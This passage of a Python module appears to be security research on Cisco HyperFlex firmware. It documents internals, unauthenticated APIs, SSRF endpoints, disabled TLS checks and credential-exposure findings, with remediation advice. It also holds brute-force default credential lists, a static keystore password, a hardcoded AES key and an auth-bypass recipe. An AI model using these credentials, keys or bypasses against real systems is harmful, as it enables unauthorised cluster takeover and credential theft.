"""
Cisco HyperFlex (HX Data Platform) — RE Module
Firmware corpus: HX-ESXi-7.0U1 through HX-ESXi-8.0U3 (install ISOs + upgrade bundles)
Architecture: Cisco-customized ESXi + stCtlVM (storage controller VM, Debian/Linux)

HyperFlex stack:
  ESXi host:   Cisco custom VIBs (hxdp-*, hx-*, springpath-*) — kernel drivers + agents
  stCtlVM:     Debian Linux VM — HX Data Platform storage stack (C++/Python/Go binaries)
               ports: 443 (HX Connect REST API), 8080 (internal), 9090 (Prometheus), 3260 (iSCSI)
  HX Connect:  HTTPS REST API — cluster management, node enrollment, Intersight claim
  UCSM:        UCS Manager XML API integration (port 443 on UCSM)
  vCenter:     Plugin integration (remote plugin OVA: HTML5-remote-plugin-Appliance-3.0.0-1173.ova)

Extraction method:
  ISO (iso9660) -> VIBs at /packages/*.vib -> .tgz -> payloads
  Upgrade bundles (.zip) -> VIBs directly
  stCtlVM: embedded as OVA or installer package inside VIBs

Default credentials (HX Connect REST API):
  POST /rest/v1/tokens {username, password} -> hx-auth-token
  Brute: admin/admin, admin/C1sco12345, admin/Cisco123, admin/HXpassword1!,
         hxadmin/C1sco12345, admin/Password1!, root/password1!, root/Cisco123,
         root/springpath, spadmin/springpath (IPMI: HX-F254)

Unauthenticated endpoints (HX Connect <4.5):
  GET /rest/v1/cluster  — cluster UUID, version, node count
  GET /rest/v1/version  — HXDP version string
  GET /rest/v1/about    — platform info

High-value authenticated endpoints:
  GET /rest/v1/nodes                        — node IPs, serial numbers, roles
  GET /rest/v1/intersight/connection        — Intersight claim code (device takeover pivot)
  GET /rest/v1/clusters/local/snapshots     — snapshot inventory
  GET /rest/v1/storage/disks               — disk topology + SN
  GET /rest/v1/cluster/security            — security config

Firmware corpus:
  storfs-packages-6.0.2b-44423.tgz — HXDP core packages (848MB)
  Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova — installer appliance (Ubuntu 64-bit, 24.8GB vdisk)
  cisco-hxdc_6.0.2b-44423_amd64.deb — Intersight Device Connector + image signing verifier
  cisco-openssl_1.1.1za_amd64.deb — private EOL OpenSSL fork + CiscoSSH replacement
  hx-iscsi_6.0.2b-44423_amd64.deb — iSCSI service (16MB ELF, not stripped)
  hx-os_6.0.2b-44423_amd64.deb — OS configs (auditd, iptables, syslog-ng)
  zookeeper_3.8.1_amd64.deb — distributed coordinator
  storfs-support-workflows-6.0.2b-44423.tgz — support debs + bootstrap workflow
  hxdp-connector bundle (inner): Go binary (UPX-packed, 25MB unpacked), version 1.0.11-20250305

Key services (from syslog-ng):
  storfs, iscsisvc, scvmclient, hxmanager, cip-monitor, replsvc, smbscvmclient, stmapper, networkMonitor
  hxmanager logs sent over TCP to syslog-ng localhost:514

Port topology (iptables_node_reset.rules):
  8092 — Springpath internal cluster bus (OUTPUT restricted to springpath/www-data)
  2003 — Graphite metrics (OUTPUT restricted to www-data)
  3260 — iSCSI (inbound from ESXi initiators)

Image signing (hxdc_release_img_verify, 32-bit ELF, not stripped):
  Cisco ROMMON code-sign library (cs_rommon_* functions — shared with IOS/NX-OS boot signing)
  RSA PKCS#1 + SHA-512; custom BigNum (RsaLibBigNum*), NOT OpenSSL
  Key storage: /opt/partner/cisco-hxdc/public-key (Cisco TLV format, multi-version with revocation)
  Bundle format: [gzip tar][440-byte Cisco RSA-3072 PKCS#1 signature]
  Dev keys: cs_rommon_platform_allow_dev_keys(0) called from main() — disabled in production

Auto-upgrade NFS path:
  Primary pushes bundle to /nfs/SYSTEM/hx_device_connector/bundle_data/hxdc_active_bundle
  Secondary nodes pull from NFS at startup; no NFS write-protection enforced in code

iscsisvc architecture (16MB PIE ELF, not stripped, statically compiled OpenSSL):
  Build path: /opt/git/cypress/opensrc/istgt/src/chap_util.c  (Cisco internal project "cypress")
  IoVisor: ESXi-side kernel driver (stHypervisorSvc VIB); iscsisvc manages IoVisor registrations
  Iscsi_RegisterIoVisor / Iscsi_GetRedirectionInfo / Iscsi_Redirect — connection redirect/LB
  Binary protections:
    PIE: YES (ELF Type DYN, FLAGS_1=PIE)
    ASLR: YES (PIE binary)
    Stack canaries: YES (__stack_chk_fail called extensively in all handlers)
    NX/DEP: YES (GNU_STACK RW, not executable)
    RELRO: PARTIAL (GNU_RELRO present, no BIND_NOW -> GOT remains writable post-load)
    Note: partial RELRO = GOT overwrite remains viable exploitation primitive if heap write-primitive found
  conn_worker_ev_pdu_exec (0x282130) — iSCSI PDU execution handler
    Stack frame: 264 bytes (sub rsp,0x108); opcode read at [rsi], masked to 6-bit via 'and eax,0x3f'
    Sequence validation: bswap r13d; compare against connection struct at [rbx+0x128]+0xdc/0xe0
    Pre-filter: bt rax,0x16 gates opcodes 0x01/0x02/0x04 through CmdSN seq validation before dispatch
    Non-filtered opcodes (0x00,0x03,0x05,0x06,0x10) bypass seq validation, checked at cmp al,0x5 first
    Jump table (relative offset, 4B entries): 0xb0bc6c; valid range opcodes 0x00-0x10; >0x10 -> error
      0x00 NOP-Out       -> 0x2828b0 (conn_worker_ev_nop_send echo path via nop_send/CB/CB2)
      0x01 SCSI Command  -> 0x282da8 -> istgt_iscsi_op_scsi (0x2751e0)
      0x02 SCSI Task Mgmt-> 0x282be0
      0x03 Login Request -> 0x282b80 -> istgt_iscsi_op_login (0x27c7e0)
      0x04 Text Request  -> 0x282b20 -> istgt_iscsi_op_text (0x26d360)
      0x05 SCSI Data-Out -> 0x282e40 (also 0x2830e0 pre-seq-check path)
      0x06 Logout Request-> 0x282e10
      0x07-0x0f reserved -> 0x282610 (error handler)
      0x10 SNACK Request -> 0x2825c8
  istgt_iscsi_op_login (0x27c7e0) — RFC 3720 Login PDU handler
    Stack frame: 2248 bytes (sub rsp,0x8c8); parses T-bit, CSG/NSG, ISID, TSIH, CmdSN, ExpStatSN
  istgt_iscsi_parse_params (0x29b990) — Text/Login key=value PDU data parser
    Key buffer: xmalloc(0x41) = 65 bytes; enforces key_len <= 64 (cmp r15d,0x40; jg error)
    Value buffer: xmalloc(0x2001) = 8193 bytes; enforces val_len <= 8192 (cmp r15d,0x2000; jg error)
    Bounds checked BEFORE copy — text negotiation parser is SAFE
  istgt_iscsi_op_data (0x276d60) — SCSI Data-Out handler
    DataSegmentLength: 24-bit from PDU bytes [5:7] (max 0xFFFFFF = 16MB)
    Bounds check at 0x276f37: rcx = BufferOffset + DataSegmentLength; cmp rcx, EDTL; ja error
    memcpy at 0x276f77: dst=task_buf+offset, src=PDU_data_ptr, size=DataSegmentLength — SAFE
  chap_decrypt_init (0x28ba30) / chap_decrypt_cleanup — CHAP (MD5) authentication
  CHAP credential infrastructure:
    ZooKeeper path: /chap/<initiator-iqn>  JSON: {chapName: <base64-ciphertext>, chapSecret: <base64-ciphertext>}
    Decrypt path (decrypt_data, 0x28bcf0):
      1. get_keystore_passwd (0x28b7e0): reads <entry key="keystore_password"> from
         /etc/hyperflex/secure/hyperflex_security.properties (fgets line scan)
      2. d2i_PKCS12_fp("/etc/hyperflex/secure/hyperflex_keystore.p12"): loads PKCS#12
      3. PKCS12_parse: extracts RSA private key
      4. BIO base64-decode ciphertext, then RSA_private_decrypt(0x100, ct, pt, key, RSA_PKCS1_PADDING=1)
    Both keystore and password file in same directory: /etc/hyperflex/secure/
  _add_dm_targets — dm-device mapper target manipulation
  PEM_write_PKCS8PrivateKey / crypt_keyslot_add_by_volume_key — LUKS integration
  AkvStor DEK cache: AkvStor->kvDEKCache->kvDataEncryptionKeys[dekIndex].isSet — in-memory LUKS key cache
  Encryption library toggle: /opt/hyperflex/storfs-core/encrypt/libcrypt_disabled.so vs libcrypt_enabled.so

hxdp connector binary (Go, UPX-packed, stripped):
  Internal project names: apollo (connector codebase), starship (HXDP), diesel (build system)
  Build server: /mnt/vol1/jenkins/workspace/starship/master/diesel/code/apollo/
  Intersight cloud WebSocket endpoint: svc-static1.ucs-connect.com
  HashiCorp Vault API paths embedded: /pki/root/sign-self-issued, /sys/revoke-force/{prefix}
  SUDI certificate authentication to Intersight
  Emulator mode path: /.device_connector_emulator/intersight/catalog/Version
  Go pprof endpoint: /debug/pprof/, /debug/pprof/cmdline, /debug/pprof/profile
  Cloud domain override env vars: ENV_ANDROMEDA_DOMAIN_NAME, ENV_SERVICE_DOMAIN_NAME, ENV_WEB_ELB_DOMAIN_NAME
  Staging Intersight domains (hardcoded in binary): cntcicd.starshipcloud.com, staging.starshipcloud.com,
    cntperf.starshipcloud.com, sretest.starshipcloud.com, cntqa.starshipcloud.com
  adsecret cipher library: adsecret_cipher.CipherIntf / adsecret.CipherMsg / adsecret.DecryptReq (AES-GCM)
  JWT: ECDSA (jwt/ecdsa.go source path embedded); stSSOMgr SSO service at localhost:9334
  Cert paths: certs/cisco-root-ca.pem; config: /etc/springpath/visorhost, /etc/springpath/stMgr.cfg
  Certificate: -----END+CERTIFICATE----- non-standard PEM footer variant present

Installer appliance filesystem (Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova, 24.2GB vdisk):
  Build: BUILD_ID=44423, BUILD_DATE=20251107, BUILD_TYPE=release, BUILD_RELEASE=6.0.2b
  /etc/hyperflex/secure/ (world-traversable, drwxr-xr-x):
    hyperflex_keystore.jceks  (rw-r--r--, 2700 bytes; Java JCEKS magic 0xCECECECE)
      Entry 1: aes_encryption (SecretKeyEntry — AES key for data-at-rest)
      Entry 2: vcenter_client (PrivateKeyEntry; CN=*.cisco.com, OU=Engineering; self-signed; valid until 2055; SHA512withRSA)
    hyperflex_security.properties -> /usr/share/hyperflex/storfs-misc/hyperflex_security.properties
      Content: <entry key="keystore_password">c3ByaW5ncGF0aA==</entry>  (base64 -> "springpath")
  nginx: conf.d + ngx_cisco_fips_module.so; server.key NOT pre-provisioned in installer (generated during deploy)
  /opt/hyperflex/auth/auth — ELF 64-bit, dynamically linked, NOT stripped (symbols available)
  auth.service: WorkingDirectory=/opt/hyperflex/auth; binds localhost:9334 (stSSOMgr)
  deployNodes.py: reads credentials.installer_passwd via parseEnvVariableTunes()
  stssoclient.py: thrift client to stSSOMgr on localhost:9334

iscsisvc SCSI path analysis:
  conn_worker_ev_nop_send (0x285f10): builds fixed NOP-In response (TTT=0xFFFFFFFF, opcode=0x20, F-bit)
    via istgt_iscsi_send_response — no echo of NOP-Out DataSegment data; SAFE
  istgt_iscsi_op_scsi (0x2751e0) EDTL handling (candidate — needs exploitation confirmation):
    EDTL = bswap([r15+0x14]) -> [rsp+0x20]
    Buffer adequacy check: lea eax,[rax+rsi*1+0x11000] at 0x2755b4 where rsi=EDTL (32-bit LEA)
    Overflow: EDTL=0xFFFFFFFF causes LEA to wrap -> cmp [r14+0x2e8],0x10FF passes for most pre-allocs
    On overflow: code proceeds with undersized buffer instead of triggering jl->0x276513 error path
    0x276513 error path: Log_UserAlert + return -1 (no dynamic realloc — fixed allocation only)
    Exploitation impact: depends on whether EDTL drives subsequent memory write (vs SCSI CDB xfer len)

auth binary (hx-auth, 9.5MB ELF, not stripped, /opt/hyperflex/auth/auth):
  Uses dgrijalva/jwt-go v4.0.0-preview1 (archived 2021-01, CVE-2020-26160 audience bypass)
  Binary contains: *jwt.signingMethodNone, *jwt.unsafeNoneMagicConstant — alg:none path compiled in
  JWT key (main.TokenSigningKey) in .bss, runtime-initialized — not hardcoded
  Service: stSSOMgr on localhost:9334, Gorilla mux v1.7.1, PAM integration via CGo

installerrestapi-1.0.0.war (60MB Java WAR, installer appliance):
  web.xml comment: "Disable AAA Authentication for installer rest api"
  SPBasicAuth (SSOBasicAuthImpl) + SPAuth (SSOAuthFilterImpl) filters commented out
  No <security-constraint> elements — entire /rest/* surface unauthenticated
  Endpoints: /rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*
  REST resources: BootstrapResource, DeploymentResource, VirtPlatformResource
  BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes, executeCommand,
                     runCommand, validateVcenterCredentials, getVcServerDetails, pings, getNodes
  DeploymentResource: getResponseFromHxdpRest(HxCredDetails, url), deployNodes, createCluster,
                      configInstaller, updateCatalog, checkDeployNodes
  Executor.executeCommand: prefix allowlist = {stcli, sysmtool, mkfs.storfs}; Runtime.exec(String[])
  pings(): Runtime.exec("timeout 1 ping -c 1 " + userInput) — BootstrapMethods #1 template confirmed
           Runtime.exec(String) tokenizes by whitespace; no shell invocation; argument injection only
  StorvisorFileUploader: /upload endpoint, multipart POST to /var/www/localhost/images/ (no auth)
  WebDownloader.trustAllHttpsCertificates(): TrustAllManager + always-valid HostnameVerifier installed
    globally via HttpsURLConnection.setDefaultSSLSocketFactory() — affects full installer JVM TLS stack
  SecurityConfigurationManager (singleton Enum): reads keystore_password from
    /etc/hyperflex/secure/hyperflex_security.properties -> Base64.getDecoder().decode() -> "springpath"
  HostCredentialsAccess(): connects to localhost Thrift + reads /etc/hyperflex/secure/root_file.pub
    .getUserName() / .getPassword() return EsxCredential.username / .password (ESXi host credentials)

ZooKeeper auth (zkClient.py / storfs-support/listzkdb.py):
  ZKClient.__enter__ auth token = "postEvent;" + cluster_uuid
  cluster_uuid source: /etc/hyperflex/clusteruuid
  ZK UUID auth scheme bypassed by GET /rest/v1/cluster (unauthenticated) -> cluster UUID field
  listzkdb.py uses paramiko.AutoAddPolicy() (SSH TOFU, no host key verification)
  Credentials logged in exception output: "Paramiko ssh connect exception: %s, host: %s user: %s password: %s"

vcCertificateUtilities.py:
  SpringpathVMWare.getServiceInstance_VCenter_SDK_Via_Certificate() -> uses vcenter_client RSA key from JCEKS (HX-F13)
  Confirms HX-F13 vCenter client cert is the live auth credential for vCenter management operations

Findings: HX-F01 (HIGH) through HX-F29 (HIGH).

storfs-restapi_6.0.2b-44423_amd64.deb (81MB) — 11 WARs on stCtlVM:
  auth, coreapi, securityservice, encryption, dataprotection, backupservice,
  hxupgrade, supportservice, iscsi, slservice, ROOT
  auth-1.0.0.war: ALL auth filters enabled (contrast: installer WAR HX-F18 disables them)
    web.xml filters: AuditFilter, SPPrivilegedAuth (SSOPrivilegeAuthImpl),
      SessionAuth (SessionCookieFilterImpl), KerberosAuth (KerberosFilterImpl),
      ServiceAccessAuth (ServiceAccessAuthFilterImpl), SPBasicAuth (SSOBasicAuthImpl),
      SPAuth (SSOAuthFilterImpl) — all mapped to /v1/*
  authfilter-1.0.0.jar (from dependencies.zip) implements filter classes:
    SSOPrivilegeAuthImpl: X-RootSessionID == /etc/hyperflex/secure/root_file.pub
      -> accepts X-LoggedInUser/X-Scope/X-RequestInitiator as identity (HX-F29)
    ServiceAccessAuthFilterImpl: short-circuits if Authenticated=True set upstream
    SSOBasicAuthImpl: standard Basic Auth validation path
    KerberosFilterImpl: Kerberos ticket path (Hyper-V hypervisor only)
    SessionCookieFilterImpl: session cookie path (ESXi hypervisor only)
  HxSecurity.getLocalSessionId(): reads /etc/hyperflex/secure/root_file.pub via FileInputStream
  AuthorizedApiServiceImpl.authorizedRequest() dispatch order:
    1. Authorization: Basic -> SSOManager.validateAuthHeaderForBasicToken()
    2. Authorization: Bearer -> SSOManager.validateAccessTokenConvertToJWT()
    3. No Authorization header -> SSOPrivilegeAuthImpl (X-RootSessionID check)
    4. If ESX: SessionCookieFilterImpl
    5. If HyperV: KerberosFilterImpl
    6. Fallback: SSOBasicAuthImpl

springpath_env_parse.py tunes credential encryption:
  AES-128-CBC; key = md5(Secret.class) as hex string = "1f6d13bcd7753f2d3b2e2da361b7afb5"
  Secret.class path: /usr/share/hyperflex/storfs-misc/Secret.class (firmware-embedded static file)
  Encrypted values stored in INI-format .tunes files:
    /opt/hyperflex/springpath_default.tunes (cluster-wide defaults)
    /opt/hyperflex/springpath_custom_cluster.tunes (cluster overrides)
    /opt/hyperflex/springpath_custom_node.tunes (per-node overrides)
  installer_passwd key: credentials.installer_passwd (read by deployNodes.py at startup)
  AES key is static across all deployments of same firmware version — any extract of firmware
  yields the key; no per-deployment key derivation.

stSSOMgr (auth binary at /opt/hyperflex/auth/auth, 9.5MB):
  Binds localhost:9334, TBinaryProtocol/TFramedTransport Thrift server (no auth)
  Interface: StSSOMgr.Client.getHypervHostCreds() -> JSON string:
    {"host": {"localadminusername": "<hyperv_admin>", "localadminusercred": "<base64_password>"}}
  Credential source: ZooKeeper (fetched and cached by auth service)
  Client (stssoclient.py): no authentication on Thrift connect; returns username + base64-decoded password

hxinstaller (Go binary, /opt/hyperflex/hxinstaller/installer, 15MB, debug info, not stripped):
  Source tree: bitbucket-eng-chn-sjc1.cisco.com/HXDP/installer-v2/server/
  Source files: create_validate.go, deploy_validate.go, hypervBareMetal.go, hyperv.go,
                hypervisor.go, validate.go, validate_hyperv.go, validate_login.go,
                validate_serversIP.go, validate_ucsm.go, validate_vcenter.go
  SQLite embedded (github.com/mattn/go-sqlite3 + CGo); DB path: installer.db
  REST endpoints (gorilla mux, runtime-registered):
    /api/validate_login, /api/upload_catalog, /api/update_catalog, /api/bundle_details
    /api/validate_hyperv, /api/configInstaller, /api/catalog_version, /api/upload_catalog_version
    /api/configure_server_ports, /api/servers/{serial}/disassociate, /api/resolve_mgmthostname
    /api/restart, /api/servers, /api/config, /api/fields, /api/upload, /api/about
    /api/proxy, /api/reset, /api/tech_support/poll, /disassoc_hv-installer
    /rest/deployment/proxy?url=<target>  (explicit SSRF proxy)
    /rest/deployment/upgradeClusterJobUCSM, /rest/deployment/updateCatalog
    /rest/deployment/checkDeployNodesJob, /rest/validate/fqdn, /rest/validate/mgmthostname
  Accepts: hxAdminPassword, vCenterPassword, esxPassword, cimcPassword fields in request bodies
  Command execution: os/exec.Cmd — "Executing command :%s" log prefix
    genisoimage via /usr/bin/genisoimagemanagement: builds hypervisorConfigData.iso
    runOSInstallAndHypervConfig: OS install + Hyper-V network config execution path
"""

import socket
import ssl
import json
import urllib.request
import urllib.error
import urllib.parse
import os
import subprocess
from typing import Optional


# ─── Default Credentials ─────────────────────────────────────────────────────

# Keystore password — static across all deployments (base64 in hyperflex_security.properties)
HX_KEYSTORE_PASSWORD = "springpath"
HX_KEYSTORE_JCEKS    = "/etc/hyperflex/secure/hyperflex_keystore.jceks"
HX_KEYSTORE_P12      = "/etc/hyperflex/secure/hyperflex_keystore.p12"
HX_KEYSTORE_PROPS    = "/etc/hyperflex/secure/hyperflex_security.properties"

HX_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "C1sco12345"),
    ("admin", "Cisco123"),
    ("admin", "cisco"),
    ("admin", "HXpassword1!"),
    ("hxadmin", "C1sco12345"),
    ("admin", "Password1!"),
    ("root", "password1!"),
    ("root", "Cisco123"),
]

HX_CONNECT_PORT = 443
HX_UNAUTH_PATHS = [
    "/rest/v1/cluster",
    "/rest/v1/version",
    "/rest/v1/about",
]

HX_AUTH_PATHS = {
    "nodes":            "/rest/v1/nodes",
    "datastores":       "/rest/v1/datastores",
    "alarms":           "/rest/v1/alarms",
    "snapshots":        "/rest/v1/clusters/local/snapshots",
    "disks":            "/rest/v1/storage/disks",
    "volumes":          "/rest/v1/volumes",
    "intersight_conn":  "/rest/v1/intersight/connection",
    "network":          "/rest/v1/network",
    "security":         "/rest/v1/cluster/security",
}

ISCSI_PORT = 3260
NFS_PORT   = 2049

UCSM_CREDS = [
    ("admin", "admin"),
    ("admin", "cisco"),
    ("admin", "C1sco12345"),
    ("admin", "password"),
]


# ─── Findings ────────────────────────────────────────────────────────────────

FINDINGS = {
    "HX-F02": {
        "title": "CiscoSSH sshd_config Sets PermitRootLogin yes by Default",
        "severity": "HIGH",
        "component": "cisco-openssl_1.1.1za_amd64.deb / /etc/ssh/sshd_config",
        "description": (
            "The CiscoSSH sshd_config installed to /etc/ssh/sshd_config sets "
            "PermitRootLogin yes, permitting direct root SSH login on every stCtlVM. "
            "Only ECDSA host key is used (RSA and ED25519 deprecated in this build)."
        ),
        "code_evidence": {
            "sshd_config line": "PermitRootLogin yes",
            "HostKey": "HostKey /etc/ssh/ssh_host_ecdsa_key (only)",
            "CiscoSSHFipsMode": "yes",
            "stsso_chroot": "Match group stsso -> ChrootDirectory /var/jail/",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F18": {
        "title": "Installer REST API Entirely Unauthenticated — All Cluster Operations Exposed",
        "severity": "CRITICAL",
        "component": "installerrestapi-1.0.0.war (WEB-INF/web.xml)",
        "description": (
            "The HyperFlex installer appliance REST API at /rest/* has authentication "
            "intentionally disabled. web.xml contains the comment "
            "'Disable AAA Authentication for installer rest api' wrapping the entire "
            "authentication filter block (SPBasicAuth and SPAuth). No <security-constraint> "
            "elements are present. All REST endpoints — including cluster creation, expansion, "
            "and shutdown; stcli command execution; vCenter credential validation; ESXi credential "
            "retrieval; file upload; and HXDP REST proxying — are accessible to any host on "
            "the management network without credentials. Applies to: "
            "/rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*."
        ),
        "code_evidence": {
            "web_xml_comment": "Disable AAA Authentication for installer rest api",
            "commented_out_filters": [
                "SPBasicAuth -> com.springpath.hx.aaa.filters.basicAuthFilter.SSOBasicAuthImpl",
                "SPAuth -> com.springpath.hx.aaa.filters.ssoFilter.SSOAuthFilterImpl",
            ],
            "commented_out_filter_mappings": ["SPBasicAuth -> /rest/*", "SPAuth -> /rest/*"],
            "unauthenticated_operations": [
                "BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes",
                "BootstrapResource: executeCommand (stcli/sysmtool/mkfs.storfs allowlist)",
                "BootstrapResource: validateVcenterCredentials, getVcServerDetails",
                "BootstrapResource: pings (internal host enumeration)",
                "DeploymentResource: getResponseFromHxdpRest (SSRF proxy to HXDP REST)",
                "DeploymentResource: configInstaller, updateCatalog, deployNodesJob",
                "StorvisorFileUploader: /upload (file write to /var/www/localhost/images/)",
                "VirtPlatformResource: getVirtualMachines, getEvents, powerOnOffVM",
            ],
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Re-enable the SPBasicAuth and SPAuth servlet filters in web.xml. "
            "At minimum, gate all write-capable endpoints (createCluster, deployNodes, upload) "
            "behind authentication. The installer appliance should not be network-accessible "
            "outside of the dedicated HyperFlex management VLAN."
        ),
    },

    "HX-F19": {
        "title": "Unauthenticated pings() Endpoint Executes OS ping on Caller-Supplied IPs",
        "severity": "MEDIUM",
        "component": "installerrestapi-1.0.0.war / BootstrapResource.pings()",
        "description": (
            "BootstrapResource.pings(List<String>) calls Runtime.exec() on a concatenation "
            "of the caller-supplied IP string with the template "
            "'timeout 1 ping -c 1 <ip>' (confirmed via BootstrapMethods attribute #1 in "
            "BootstrapResource.class). Because Runtime.exec(String) tokenizes by whitespace "
            "without shell invocation, classic shell metacharacters do not achieve code "
            "execution. However, the endpoint accepts a "
            "list of arbitrary IP strings, enabling: (1) internal management network host "
            "enumeration — any IP that returns exit code 0 is added to the response; "
            "(2) argument injection via embedded spaces — flags can be appended to the ping "
            "command. The response is the list of IPs that were reachable."
        ),
        "code_evidence": {
            "call_site": "BootstrapResource.pings() offset 0x40-0x55",
            "exec_call": "java.lang.Runtime.getRuntime().exec(String) at bytecode offset 69",
            "template": "timeout 1 ping -c 1 <userInput>",
            "template_source": "BootstrapMethods attribute #1: '#2567 timeout 1 ping -c 1 \\u0001'",
            "no_shell": "Runtime.exec(String) uses StringTokenizer — no shell metachar expansion",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
    },

    "HX-F20": {
        "title": "Unauthenticated HXDP REST Proxy Enables SSRF into Internal Cluster Services",
        "severity": "HIGH",
        "component": "installerrestapi-1.0.0.war / DeploymentResource.getResponseFromHxdpRest()",
        "description": (
            "DeploymentResource.getResponseFromHxdpRest(HxCredDetails creds, String urlPath) "
            "accepts caller-supplied credentials and a URL path, proxies the request to the "
            "internal HXDP REST API via the installer's Thrift client, and returns the raw "
            "response. The endpoint is unauthenticated. An attacker on the management "
            "network can use the installer as an authenticated relay into the deployed cluster's "
            "REST API — issuing management operations against a live cluster without direct "
            "network access to it, supplying any credentials in the HxCredDetails body."
        ),
        "code_evidence": {
            "method_signature": (
                "public JsonObject getResponseFromHxdpRest("
                "com.storvisor.sysmgmt.bootstrap.model.HxCredDetails, java.lang.String)"
            ),
            "backing_service": "DeploymentServiceAccess.getResponseFromHxdpRest() -> StDeploy$Client Thrift",
            "thrift_endpoint": "strings: 'Connecting to {}' + 'trustAll' -> /stdeploy",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": "Require authentication on all /rest/* endpoints. "
                       "Validate the URL path parameter against an allowlist; reject paths containing "
                       "scheme prefixes, parent-directory sequences, and internal-only service identifiers.",
    },


    "HX-F22": {
        "title": "Installer JVM Globally Disables TLS Certificate Validation via TrustAllManager",
        "severity": "MEDIUM",
        "component": "installerrestapi-1.0.0.war / WebDownloader.trustAllHttpsCertificates()",
        "description": (
            "WebDownloader.trustAllHttpsCertificates() installs a no-op TrustManager "
            "(TrustAllManager) and an always-accepting HostnameVerifier globally into "
            "javax.net.ssl.HttpsURLConnection via setDefaultSSLSocketFactory() and "
            "setDefaultHostnameVerifier(). Both DeploymentServiceAccess and DataServiceAccess "
            "call trustAll before establishing Thrift connections to backend services, making "
            "this the live execution path during all installer-to-cluster communication. "
            "Any HTTPS connection from the installer JVM process — including cluster deployment "
            "callbacks, catalog downloads, and HXDP REST proxy calls — is susceptible to "
            "MITM on the management network."
        ),
        "code_evidence": {
            "class": "com.storvisor.sysmgmt.service.WebDownloader",
            "inner_class": "WebDownloader$TrustAllManager (implements javax.net.ssl.TrustManager)",
            "install_site": "HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory())",
            "hostname_verifier": "WebDownloader$2 (always returns true)",
            "callers": ["DeploymentServiceAccess.openClientConnection()", "DataServiceAccess.openClientConnection()"],
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": "Remove TrustAllManager and the global SSL socket factory override. "
                       "Use a dedicated SSLContext loaded from the JCEKS keystore (HX-F13) for "
                       "cluster connections; validate cluster certificates against a pinned CA.",
    },



    "HX-F25": {
        "title": "Installer Go Binary Exposes Explicit SSRF Proxy Endpoint at /rest/deployment/proxy",
        "severity": "HIGH",
        "component": "/opt/hyperflex/hxinstaller/installer (Go binary, REST API)",
        "description": (
            "The HyperFlex installer Go binary (hxinstaller/installer) registers a REST "
            "endpoint at /rest/deployment/proxy?url=<target>. The endpoint accepts an "
            "arbitrary URL via the 'url' query parameter and proxies the request to the "
            "specified target, returning the response. This is an explicit server-side "
            "request forgery primitive built into the installer service. The auth posture "
            "of this endpoint in the Go binary's own mux is not separately confirmed, but "
            "the endpoint is structurally an SSRF proxy regardless of auth status."
        ),
        "code_evidence": {
            "endpoint_string": "/rest/deployment/proxy?url=",
            "binary": "/opt/hyperflex/hxinstaller/installer (Go, 15MB, not stripped)",
            "source_tree": "bitbucket-eng-chn-sjc1.cisco.com/HXDP/installer-v2/server/",
            "route_registration": "gorilla mux (runtime-assembled routes)",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Remove the /rest/deployment/proxy endpoint or gate it to internal use only. "
            "If a proxy is required for cluster communication, restrict the target URL to "
            "an allowlist of known internal service addresses and ports. "
            "Log all proxy requests with full URL for audit."
        ),
    },

    "HX-F26": {
        "title": "stSSOMgr Thrift Service Exposes Hyper-V Host Admin Credentials Without Authentication",
        "severity": "HIGH",
        "component": "/opt/hyperflex/auth/auth (stSSOMgr service, localhost:9334)",
        "description": (
            "The HyperFlex auth binary runs the stSSOMgr Thrift service on localhost:9334 "
            "using TBinaryProtocol/TFramedTransport with no authentication layer on the "
            "Thrift connection. The StSSOMgr.getHypervHostCreds() RPC returns a JSON object "
            "containing the Hyper-V host local admin username and base64-encoded password: "
            "{'host': {'localadminusername': '<user>', 'localadminusercred': '<b64_pass>'}}. "
            "Credentials are sourced from ZooKeeper. Any local process that can reach "
            "localhost:9334 can retrieve Windows Hyper-V host admin credentials by opening "
            "a raw Thrift connection without presenting any credential."
        ),
        "code_evidence": {
            "service_port": "localhost:9334 (TSocket.TSocket('localhost', 9334))",
            "transport": "TTransport.TFramedTransport (no auth wrapper)",
            "rpc": "StSSOMgr.Client.getHypervHostCreds()",
            "response_schema": (
                "JSON: {'host': {'localadminusername': str, 'localadminusercred': str (base64)}}"
            ),
            "auth_on_connect": None,
            "source_file": "/opt/hyperflex/stssoclient.py",
            "service_binary": "/opt/hyperflex/auth/auth",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance + stCtlVM)"],
        "remediation": (
            "Add Thrift transport-level authentication to stSSOMgr (e.g., SASL/PLAIN or "
            "a pre-shared token validated on every connection). Restrict port 9334 to "
            "specific authorized callers via process-level controls or Unix domain socket "
            "instead of TCP. Rotate the Hyper-V admin credentials independently of the "
            "stSSOMgr credential vault."
        ),
    },

    "HX-F27": {
        "title": "Installer deployNodes.py Disables TLS Certificate Verification for All HTTP Calls",
        "severity": "MEDIUM",
        "component": "/opt/hyperflex/deployNodes.py",
        "description": (
            "deployNodes.py passes verify=False to every requests.get() and requests.post() "
            "call — covering cluster deployment status polling, checkDeployNodes, and "
            "deployNodes REST calls against the installer appliance. The verify=False flag "
            "disables both certificate chain validation and hostname verification in the "
            "Python requests library. All HTTPS connections from this script — including "
            "those transmitting authentication credentials (Basic Auth via auth=authData) "
            "and cluster deployment payloads — are susceptible to MITM on the management "
            "network. The installer password (credentials.installer_passwd) is transmitted "
            "as HTTP Basic Auth over these unvalidated HTTPS connections."
        ),
        "code_evidence": {
            "pattern": "requests.get/post(url, auth=authData, verify=False, ...)",
            "occurrences": [
                "deploymentsUrl GET (line 148)",
                "progressUrl GET (line 152)",
                "checkDeployNodesUrl POST (lines 156, 164)",
                "deployNodesUrl POST (lines 160, 169)",
            ],
